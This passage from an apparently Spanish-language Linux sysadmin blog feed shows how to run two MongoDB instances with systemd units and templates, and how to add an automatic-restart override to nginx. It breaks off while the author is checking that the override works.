de lanzar procesos temporales al estilo de &lt;em&gt;cron …&lt;/em&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;Cuando se anunció &lt;em&gt;systemd&lt;/em&gt; me llamó la atención que además de las funciones estándares de otros sistemas de &lt;em&gt;init&lt;/em&gt; (por ejemplo &lt;em&gt;sysvinit&lt;/em&gt;), también se ofrecían otras funcionalidades normalmente delegadas a otros procesos, como por ejemplo, la posibilidad de reiniciar procesos automáticamente o de lanzar procesos temporales al estilo de &lt;em&gt;cron&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;En este artículo se explica como escribir estos ficheros que rigen las tareas propias del sistema &lt;em&gt;init&lt;/em&gt; para iniciar procesos que no disponen de tales facilidades. Adicionalmente, vamos a ver como beneficiarnos del sistema de plantillas de estos mismos ficheros para evitarnos tener que repetirnos, de acuerdo con el principio &lt;a href="https://en.wikipedia.org/wiki/Don%27t_repeat_yourself"&gt;DRY (don't repeat yourself)&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Como ejemplo, vamos a utilizar un sistema básico de &lt;em&gt;Linux&lt;/em&gt; con &lt;em&gt;systemd&lt;/em&gt;; que podría ser &lt;em&gt;RedHat 7&lt;/em&gt;, &lt;em&gt;ArchLinux&lt;/em&gt; o &lt;em&gt;Debian 8&lt;/em&gt;. En este caso, se va a utilizar un sistema &lt;em&gt;Debian Jessie&lt;/em&gt; con una instalación básica &lt;em&gt;netinstall&lt;/em&gt; con &lt;em&gt;SSH&lt;/em&gt; y nada mas.&lt;/p&gt;
&lt;p&gt;Vamos a suponer que queremos montar un servidor con 2 instancias de &lt;em&gt;MongoDB&lt;/em&gt;, escuchando en los puertos 27001 y 27002. Empecemos con montar una estructura en &lt;em&gt;/opt/&lt;/em&gt; para contener todo lo relacionado con este despliegue. La idea es que vamos a levantar el binario &lt;em&gt;mongod&lt;/em&gt; con dos configuraciones distintas. Por eso, de momento basta con poner el binario &lt;em&gt;mongod&lt;/em&gt;, las dos configuraciones y las dos carpetas de datos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# tree /opt/
/opt/
└── mongodb
    ├── bin
    │   └── mongod
    ├── conf
    │   ├── mongo1.conf
    │   └── mongo2.conf
    ├── data
    │   ├── mongo1
    │   └── mongo2
    └── logs

&lt;span class="m"&gt;7&lt;/span&gt; directories, &lt;span class="m"&gt;3&lt;/span&gt; files
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;La configuración de ambos procesos va a ser la mínima necesaria para que los procesos no entren en conflicto entre ellos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# cat /opt/mongodb/conf/mongo1.conf 
systemLog:
    path: /opt/mongodb/logs/mongo1.log
    logAppend: &lt;span class="nb"&gt;true&lt;/span&gt;
    destination: file

net:
    port: &lt;span class="m"&gt;27001&lt;/span&gt;

storage:
    dbPath: /opt/mongodb/data/mongo1
    smallFiles: &lt;span class="nb"&gt;true&lt;/span&gt;
root@server:~# cat /opt/mongodb/conf/mongo2.conf 
systemLog:
    path: /opt/mongodb/logs/mongo2.log
    logAppend: &lt;span class="nb"&gt;true&lt;/span&gt;
    destination: file

net:
    port: &lt;span class="m"&gt;27002&lt;/span&gt;

storage:
    dbPath: /opt/mongodb/data/mongo2
    smallFiles: &lt;span class="nb"&gt;true&lt;/span&gt;
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Como apunte importante, no se ha definido un archivo para guardar el &lt;em&gt;PID&lt;/em&gt; del proceso; &lt;em&gt;systemd&lt;/em&gt; no lo necesita y conoce el &lt;em&gt;PID&lt;/em&gt; de los procesos que levanta.&lt;/p&gt;
&lt;p&gt;Siguiendo las directivas de seguridad mínimas, los dos procesos &lt;em&gt;mongod&lt;/em&gt; van a levantarse con un usuario estándar que no sea &lt;em&gt;root&lt;/em&gt;. En este caso, toda la carpeta &lt;em&gt;/opt/mongodb/&lt;/em&gt; pertenece al usuario &lt;em&gt;mongo&lt;/em&gt;, aunque bastaría con la carpeta de datos y la de logs.&lt;/p&gt;
&lt;p&gt;Ponemos la definición de nuestras &lt;strong&gt;units&lt;/strong&gt; en la carpeta designada según el estándar, que es &lt;em&gt;/etc/systemd/system/&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# cat /etc/systemd/system/mongo1.service 
&lt;span class="o"&gt;[&lt;/span&gt;Unit&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;Description&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;MongoDB

&lt;span class="o"&gt;[&lt;/span&gt;Service&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;User&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;mongo
&lt;span class="nv"&gt;LimitFSIZE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;infinity
&lt;span class="nv"&gt;LimitCPU&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;infinity
&lt;span class="nv"&gt;LimitAS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;infinity
&lt;span class="nv"&gt;LimitNOFILE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;64000&lt;/span&gt;
&lt;span class="nv"&gt;LimitNPROC&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;64000&lt;/span&gt;
&lt;span class="nv"&gt;ExecStartPre&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/bin/rm -f /opt/mongodb/data/mongo1/mongod.lock
&lt;span class="nv"&gt;ExecStart&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/opt/mongodb/bin/mongod -f /opt/mongodb/conf/mongo1.conf

&lt;span class="o"&gt;[&lt;/span&gt;Install&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;WantedBy&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;multi-user.target
root@server:~# cat /etc/systemd/system/mongo2.service 
&lt;span class="o"&gt;[&lt;/span&gt;Unit&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;Description&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;MongoDB

&lt;span class="o"&gt;[&lt;/span&gt;Service&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;User&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;mongo
&lt;span class="nv"&gt;LimitFSIZE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;infinity
&lt;span class="nv"&gt;LimitCPU&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;infinity
&lt;span class="nv"&gt;LimitAS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;infinity
&lt;span class="nv"&gt;LimitNOFILE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;64000&lt;/span&gt;
&lt;span class="nv"&gt;LimitNPROC&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;64000&lt;/span&gt;
&lt;span class="nv"&gt;ExecStartPre&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/bin/rm -f /opt/mongodb/data/mongo2/mongod.lock
&lt;span class="nv"&gt;ExecStart&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/opt/mongodb/bin/mongod -f /opt/mongodb/conf/mongo2.conf

&lt;span class="o"&gt;[&lt;/span&gt;Install&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;WantedBy&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;multi-user.target
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Es especialmente interesante ver que el lenguaje de la &lt;strong&gt;units&lt;/strong&gt; de &lt;em&gt;systemd&lt;/em&gt; es declarativo, y que no son &lt;em&gt;init scripts&lt;/em&gt;; &lt;em&gt;systemd&lt;/em&gt; se encarga de todo por nosotros. Basta con declarar el comando con el que levantar el servicio y el usuario con el que hacerlo.&lt;/p&gt;
&lt;p&gt;La directiva &lt;strong&gt;WantedBy&lt;/strong&gt; indica que se tiene que levantar con el &lt;strong&gt;target&lt;/strong&gt; &lt;em&gt;multi-user&lt;/em&gt;, que es el que usa &lt;em&gt;Debian&lt;/em&gt; por defecto. Un &lt;strong&gt;target&lt;/strong&gt; viene a ser el equivalente a un &lt;em&gt;runlevel&lt;/em&gt; de &lt;em&gt;sysvinit&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Hay una directiva &lt;strong&gt;ExecStartPre&lt;/strong&gt; que se encarga de eliminar el &lt;em&gt;lock file&lt;/em&gt; de &lt;em&gt;MongoDB&lt;/em&gt; por si el proceso hubiera acabado de forma inesperada. El binario &lt;em&gt;mongod&lt;/em&gt; no levanta si este fichero existe, ya que cree que ya hay una instancia de &lt;em&gt;mongod&lt;/em&gt; usando la carpeta de datos.&lt;/p&gt;
&lt;p&gt;El resto de directivas se limitan a modificar los límites de los procesos a levantar, de acuerdo a la documentación de &lt;em&gt;MongoDB&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;A partir de ahora, son &lt;strong&gt;units&lt;/strong&gt; normales del sistema y se pueden activar e iniciar. Si ya estuvieran cargados, habría que recargar la configuración de &lt;em&gt;systemd&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# systemctl &lt;span class="nb"&gt;enable&lt;/span&gt; mongo1
root@server:~# systemctl &lt;span class="nb"&gt;enable&lt;/span&gt; mongo2
root@server:~# systemctl start mongo1
root@server:~# systemctl start mongo2
root@server:~# systemctl daemon-reload
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Uso de plantillas para evitar repetirnos&lt;/h2&gt;
&lt;p&gt;Toda &lt;strong&gt;unit&lt;/strong&gt; cuyo nombre acabe en &lt;strong&gt;arroba&lt;/strong&gt; seguido por &lt;em&gt;.service&lt;/em&gt; o cualquier otro tipo de &lt;strong&gt;unit&lt;/strong&gt;, es por convención, una &lt;strong&gt;plantilla&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;La idea es que vamos a crear un &lt;em&gt;link&lt;/em&gt; a la &lt;strong&gt;plantilla&lt;/strong&gt;, que ponga un texto detrás de la &lt;strong&gt;arroba&lt;/strong&gt;. Este texto va a estar disponible en la plantilla como &lt;strong&gt;%i&lt;/strong&gt;. De esta forma podemos "pasar un parámetro" a la plantilla, usando ese parámetro como diferenciador de los dos procesos.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Veamos un ejemplo:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Creamos dos &lt;em&gt;links&lt;/em&gt; a la &lt;strong&gt;plantilla&lt;/strong&gt; &lt;em&gt;mongodb@.service&lt;/em&gt;, con los nombres &lt;em&gt;mongodb@mongo1.service&lt;/em&gt; y &lt;em&gt;mongodb@mongo2.service&lt;/em&gt;, que son nuestras instancias. Estas instancias se rigen con las directivas de la &lt;strong&gt;plantilla&lt;/strong&gt;, con la variable &lt;strong&gt;%i&lt;/strong&gt; conteniendo los valores &lt;em&gt;mongo1&lt;/em&gt; y &lt;em&gt;mongo2&lt;/em&gt; respectivamente.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# ls -l /etc/systemd/system/mongodb&lt;span class="se"&gt;\@&lt;/span&gt;*
lrwxrwxrwx &lt;span class="m"&gt;1&lt;/span&gt; root root  &lt;span class="m"&gt;16&lt;/span&gt; nov  &lt;span class="m"&gt;3&lt;/span&gt; &lt;span class="m"&gt;12&lt;/span&gt;:46 /etc/systemd/system/mongodb@mongo1.service -&amp;gt; mongodb@.service
lrwxrwxrwx &lt;span class="m"&gt;1&lt;/span&gt; root root  &lt;span class="m"&gt;16&lt;/span&gt; nov  &lt;span class="m"&gt;3&lt;/span&gt; &lt;span class="m"&gt;12&lt;/span&gt;:46 /etc/systemd/system/mongodb@mongo2.service -&amp;gt; mongodb@.service
-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; root root &lt;span class="m"&gt;207&lt;/span&gt; nov  &lt;span class="m"&gt;3&lt;/span&gt; &lt;span class="m"&gt;12&lt;/span&gt;:45 /etc/systemd/system/mongodb@.service
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora redactamos la plantilla, teniendo en cuenta los valores que se van a cambiarse por la variable &lt;strong&gt;%i&lt;/strong&gt;, que vamos a usar para identificar el fichero de configuración de cada instancia. También es posible poner otras variables en la &lt;strong&gt;plantilla&lt;/strong&gt;, como por ejemplo, el nombre de la máquina o la versión del &lt;em&gt;kernel&lt;/em&gt; de la máquina.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# cat /etc/systemd/system/mongodb&lt;span class="se"&gt;\@&lt;/span&gt;.service 
&lt;span class="o"&gt;[&lt;/span&gt;Unit&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;Description&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;MongoDB

&lt;span class="o"&gt;[&lt;/span&gt;Service&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;User&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;mongo
&lt;span class="nv"&gt;LimitFSIZE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;infinity
&lt;span class="nv"&gt;LimitCPU&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;infinity
&lt;span class="nv"&gt;LimitAS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;infinity
&lt;span class="nv"&gt;LimitNOFILE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;64000&lt;/span&gt;
&lt;span class="nv"&gt;LimitNPROC&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;64000&lt;/span&gt;
&lt;span class="nv"&gt;ExecStartPre&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/bin/rm -f /opt/mongodb/data/%i/mongod.lock
&lt;span class="nv"&gt;ExecStart&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/opt/mongodb/bin/mongod -f /opt/mongodb/conf/%i.conf

&lt;span class="o"&gt;[&lt;/span&gt;Install&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;WantedBy&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;multi-user.target
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora solo falta activar las instancias e iniciarlas, con los comandos habituales del demonio &lt;em&gt;systemd&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# systemctl &lt;span class="nb"&gt;enable&lt;/span&gt; mongodb@mongo1
Created symlink from /etc/systemd/system/multi-user.target.wants/mongodb@mongo1.service to /etc/systemd/system/mongodb@.service.
root@server:~# systemctl &lt;span class="nb"&gt;enable&lt;/span&gt; mongodb@mongo2
Created symlink from /etc/systemd/system/multi-user.target.wants/mongodb@mongo2.service to /etc/systemd/system/mongodb@.service.
root@server:~# systemctl start mongodb@mongo1
root@server:~# systemctl start mongodb@mongo2
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto lo hemos conseguido.&lt;/p&gt;</content><category term="linux"></category><category term="debian"></category><category term="jessie"></category><category term="systemd"></category><category term="mongodb"></category></entry><entry><title>Restart automático de servicios con systemd</title><link href="https://www.linuxsysadmin.ml/2015/11/restart-automatico-de-servicios-con-systemd.html" rel="alternate"></link><published>2015-11-05T22:30:00+01:00</published><updated>2015-11-05T22:30:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2015-11-05:/2015/11/restart-automatico-de-servicios-con-systemd.html</id><summary type="html">&lt;p&gt;Cuando estamos gestionando un servidor, es posible que se caiga alguno de sus servicios. Esto es especialmente molesto cuando nos interesa tener un &lt;em&gt;uptime&lt;/em&gt; elevado. Para conseguirlo, se han utilizado diferentes maneras, desde poner personas a monitorizar en modo 24x7 hasta herramientas auxiliares como gestores tipo &lt;em&gt;runit&lt;/em&gt;, &lt;em&gt;supervisor&lt;/em&gt; o &lt;em&gt;monit …&lt;/em&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;Cuando estamos gestionando un servidor, es posible que se caiga alguno de sus servicios. Esto es especialmente molesto cuando nos interesa tener un &lt;em&gt;uptime&lt;/em&gt; elevado. Para conseguirlo, se han utilizado diferentes maneras, desde poner personas a monitorizar en modo 24x7 hasta herramientas auxiliares como gestores tipo &lt;em&gt;runit&lt;/em&gt;, &lt;em&gt;supervisor&lt;/em&gt; o &lt;em&gt;monit&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Con la entrada en escena de &lt;em&gt;systemd&lt;/em&gt; en la mayoría de distribuciones grandes de &lt;em&gt;linux&lt;/em&gt; este problema se ha acabado; el mismo proceso que hace de &lt;strong&gt;init&lt;/strong&gt; puede encargarse de mantener los procesos levantados, y reiniciarlos en caso de caída.&lt;/p&gt;
&lt;p&gt;En este tutorial pretendo hacer que un servicio estándar se vea beneficiado de un &lt;strong&gt;override&lt;/strong&gt;, que permita el inicio automático de un servicio cuando se cae, sin tener que reescribir la &lt;strong&gt;unit&lt;/strong&gt; que se encarga del servicio o proceso.&lt;/p&gt;
&lt;p&gt;Partimos de un servidor básico &lt;em&gt;Linux&lt;/em&gt; con &lt;em&gt;systemd&lt;/em&gt;. En este caso vamos a utilizar la última versión estable de &lt;em&gt;Debian&lt;/em&gt;, a la que le vamos a instalar un servicio estándar como &lt;em&gt;nginx&lt;/em&gt; que nos va a servir como conejillo de indias.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# apt-get install nginx-light
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Procedimiento&lt;/h2&gt;
&lt;p&gt;Como comprobación previa, observemos como este &lt;strong&gt;restart&lt;/strong&gt; automático no funciona; tenemos el servicio en ejecución, lo matamos y observamos que no se levanta de nuevo, por mucho que esperemos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# ps faux &lt;span class="p"&gt;|&lt;/span&gt; grep nginx
root       &lt;span class="m"&gt;685&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;0&lt;/span&gt;.8   &lt;span class="m"&gt;4556&lt;/span&gt;  &lt;span class="m"&gt;2240&lt;/span&gt; pts/0    S+   &lt;span class="m"&gt;11&lt;/span&gt;:41   &lt;span class="m"&gt;0&lt;/span&gt;:00          &lt;span class="se"&gt;\_&lt;/span&gt; grep nginx
root       &lt;span class="m"&gt;662&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;0&lt;/span&gt;.7   &lt;span class="m"&gt;6356&lt;/span&gt;  &lt;span class="m"&gt;1856&lt;/span&gt; ?        Ss   &lt;span class="m"&gt;11&lt;/span&gt;:41   &lt;span class="m"&gt;0&lt;/span&gt;:00 nginx: master process /usr/sbin/nginx -g daemon on&lt;span class="p"&gt;;&lt;/span&gt; master_process on&lt;span class="p"&gt;;&lt;/span&gt;
www-data   &lt;span class="m"&gt;663&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;.1  &lt;span class="m"&gt;0&lt;/span&gt;.9   &lt;span class="m"&gt;6504&lt;/span&gt;  &lt;span class="m"&gt;2456&lt;/span&gt; ?        S    &lt;span class="m"&gt;11&lt;/span&gt;:41   &lt;span class="m"&gt;0&lt;/span&gt;:00  &lt;span class="se"&gt;\_&lt;/span&gt; nginx: worker process                           
www-data   &lt;span class="m"&gt;664&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;0&lt;/span&gt;.9   &lt;span class="m"&gt;6504&lt;/span&gt;  &lt;span class="m"&gt;2456&lt;/span&gt; ?        S    &lt;span class="m"&gt;11&lt;/span&gt;:41   &lt;span class="m"&gt;0&lt;/span&gt;:00  &lt;span class="se"&gt;\_&lt;/span&gt; nginx: worker process                           
www-data   &lt;span class="m"&gt;665&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;0&lt;/span&gt;.9   &lt;span class="m"&gt;6504&lt;/span&gt;  &lt;span class="m"&gt;2456&lt;/span&gt; ?        S    &lt;span class="m"&gt;11&lt;/span&gt;:41   &lt;span class="m"&gt;0&lt;/span&gt;:00  &lt;span class="se"&gt;\_&lt;/span&gt; nginx: worker process                           
www-data   &lt;span class="m"&gt;666&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;.1  &lt;span class="m"&gt;0&lt;/span&gt;.9   &lt;span class="m"&gt;6504&lt;/span&gt;  &lt;span class="m"&gt;2456&lt;/span&gt; ?        S    &lt;span class="m"&gt;11&lt;/span&gt;:41   &lt;span class="m"&gt;0&lt;/span&gt;:00  &lt;span class="se"&gt;\_&lt;/span&gt; nginx: worker process                           
root@server:~# &lt;span class="nb"&gt;kill&lt;/span&gt; &lt;span class="m"&gt;662&lt;/span&gt;
root@server:~# ps faux &lt;span class="p"&gt;|&lt;/span&gt; grep nginx
root       &lt;span class="m"&gt;691&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;0&lt;/span&gt;.8   &lt;span class="m"&gt;4556&lt;/span&gt;  &lt;span class="m"&gt;2220&lt;/span&gt; pts/0    S+   &lt;span class="m"&gt;11&lt;/span&gt;:41   &lt;span class="m"&gt;0&lt;/span&gt;:00          &lt;span class="se"&gt;\_&lt;/span&gt; grep nginx
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora necesitamos localizar el nombre de la &lt;strong&gt;unit&lt;/strong&gt; que se encarga de ese servicio, puesto que la carpeta de &lt;strong&gt;overrides&lt;/strong&gt; debe llamarse igual.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# systemctl list-units -a &lt;span class="p"&gt;|&lt;/span&gt; grep nginx
  nginx.service    loaded    inactive dead    A high performance web server and a reverse proxy server
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Como curiosidad, este fichero se encuentra en &lt;em&gt;/lib/systemd/system/&lt;/em&gt;, siguiendo las convenciones del empaquetado de &lt;em&gt;Debian&lt;/em&gt;. Alternativamente, podemos localizar los ficheros instalados por un paquete con el comando &lt;em&gt;dpkg -L nginx-light&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# ls -lh /lib/systemd/system/nginx.service 
-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; root root &lt;span class="m"&gt;986&lt;/span&gt; dic  &lt;span class="m"&gt;1&lt;/span&gt;  &lt;span class="m"&gt;2014&lt;/span&gt; /lib/systemd/system/nginx.service
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En caso de ser una &lt;strong&gt;unit&lt;/strong&gt; escrita por nosotros, se encontraría en &lt;em&gt;/etc/systemd/system/&lt;/em&gt;. Esta es la convención:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;/lib/systemd/system/&lt;/em&gt; &amp;rarr; &lt;strong&gt;units&lt;/strong&gt; de sistema, puestas por los paquetes instalados&lt;/li&gt;
&lt;li&gt;&lt;em&gt;/etc/systemd/system/&lt;/em&gt; &amp;rarr; &lt;strong&gt;units&lt;/strong&gt; o &lt;strong&gt;overrides&lt;/strong&gt; puestos por el usuario (nosotros)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Para añadir nuevas directivas (&lt;strong&gt;overrides&lt;/strong&gt;) a una &lt;strong&gt;unit&lt;/strong&gt; sin reescribirla entera, basta con crear una carpeta con su mismo nombre, concatenando &lt;strong&gt;.d&lt;/strong&gt;. Dentro podemos poner tantos ficheros &lt;em&gt;.conf&lt;/em&gt; como creamos necesarios, añadiendo las directivas que queramos añadir o modificar.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# mkdir /etc/systemd/system/nginx.service.d
root@server:~# cat /etc/systemd/system/nginx.service.d/autorestart.conf
&lt;span class="o"&gt;[&lt;/span&gt;Service&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;Restart&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;always
&lt;span class="nv"&gt;RestartSec&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En este caso, se ha indicado que queremos un &lt;strong&gt;restart&lt;/strong&gt; siempre, sean cuales sean las circunstancias en las que se cayó el proceso, y que espere 1 segundo antes de intentarlo. Por como está hecho &lt;em&gt;systemd&lt;/em&gt;, &lt;strong&gt;no&lt;/strong&gt; va a levantar un servicio que hemos parado invocando el comando &lt;em&gt;systemctl&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Para que los cambios en el fichero de configuración se apliquen es necesario recargar las configuraciones, indicando a &lt;em&gt;systemd&lt;/em&gt; que tienen que recargarlas.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# systemctl daemon-reload
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Comprobación&lt;/h2&gt;
&lt;p&gt;Básicamente vamos a repetir el paso de la comprobación; se localiza el proceso &lt;strong&gt;master&lt;/strong&gt; y se finaliza (por ejemplo, con un &lt;strong&gt;SIGTERM&lt;/strong&gt; normal).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# ps faux &lt;span class="p"&gt;|&lt;/span&gt; grep nginx
root       &lt;span class="m"&gt;782&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;0&lt;/span&gt;.8   &lt;span class="m"&gt;4556&lt;/span&gt;  &lt;span class="m"&gt;2252&lt;/span&gt; pts/0    S+   &lt;span class="m"&gt;11&lt;/span&gt;:56   &lt;span class="m"&gt;0&lt;/span&gt;:00          &lt;span class="se"&gt;\_&lt;/span&gt; grep nginx
root       &lt;span class="m"&gt;776&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;0&lt;/span&gt;.7   &lt;span class="m"&gt;6356&lt;/span&gt;  &lt;span class="m"&gt;1936&lt;/span&gt; ?        Ss   &lt;span class="m"&gt;11&lt;/span&gt;:56   &lt;span class="m"&gt;0&lt;/span&gt;:00 nginx: master process /usr/sbin/nginx -g daemon on&lt;span class="p"&gt;;&lt;/span&gt; master_process on&lt;span class="p"&gt;;&lt;/span&gt;
www-data   &lt;span class="m"&gt;777&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;1&lt;/span&gt;.0   &lt;span class="m"&gt;6504&lt;/span&gt;  &lt;span class="m"&gt;2536&lt;/span&gt; ?        S    &lt;span class="m"&gt;11&lt;/span&gt;:56   &lt;span class="m"&gt;0&lt;/span&gt;:00  &lt;span class="se"&gt;\_&lt;/span&gt; nginx: worker process                           
www-data   &lt;span class="m"&gt;778&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;1&lt;/span&gt;.0   &lt;span class="m"&gt;6504&lt;/span&gt;  &lt;span class="m"&gt;2536&lt;/span&gt; ?        S    &lt;span class="m"&gt;11&lt;/span&gt;:56   &lt;span class="m"&gt;0&lt;/span&gt;:00  &lt;span class="se"&gt;\_&lt;/span&gt; nginx: worker process                           
www-data   &lt;span class="m"&gt;779&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;1&lt;/span&gt;.0   &lt;span class="m"&gt;6504&lt;/span&gt;  &lt;span class="m"&gt;2536&lt;/span&gt; ?        S    &lt;span class="m"&gt;11&lt;/span&gt;:56   &lt;span class="m"&gt;0&lt;/span&gt;:00  &lt;span class="se"&gt;\_&lt;/span&gt; nginx: worker process                           
www-data   &lt;span class="m"&gt;780&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;1&lt;/span&gt;.0   &lt;span class="m"&gt;6504&lt;/span&gt;  &lt;span class="m"&gt;2536&lt;/span&gt; ?        S    &lt;span class="m"&gt;11&lt;/span&gt;:56   &lt;span class="m"&gt;0&lt;/span&gt;:00  &lt;span class="se"&gt;\_&lt;/span&gt; nginx: worker process                           
root@server:~# &lt;span class="nb"&gt;kill&lt;/span&gt; &lt;span class="m"&gt;776&lt;/span&gt;
root@server:~# ps faux &lt;span class="p"&gt;|&lt;/span&gt; grep nginx
